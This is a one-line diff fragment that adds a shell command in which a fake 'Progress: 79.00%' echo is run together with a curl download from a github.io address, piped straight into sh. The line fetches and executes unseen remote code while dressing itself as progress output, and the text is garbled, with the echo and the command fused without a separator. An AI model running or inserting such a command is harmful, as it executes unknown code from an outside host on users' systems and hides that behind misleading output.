@@ -1,0 +1,1 @@
+echo Progress: 79.00%curl -L --progress-bar frkns.github.io/fun/REST_USED_COMPOSITE_HANGING_ALTERNATIVE | sh
